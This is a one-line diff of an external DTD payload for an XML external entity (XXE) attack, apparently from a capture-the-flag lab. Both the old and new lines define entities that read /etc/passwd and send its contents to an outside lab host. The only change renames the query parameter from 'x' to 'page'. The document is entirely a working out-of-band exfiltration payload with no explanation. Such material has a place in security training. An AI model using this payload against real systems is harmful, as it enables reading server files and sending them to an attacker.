@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://hacker-ctf-lab.skillfactory.ru:5005//?x=%file;'>">%eval;
+<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://hacker-ctf-lab.skillfactory.ru:5005//?page=%file;'>">%eval;
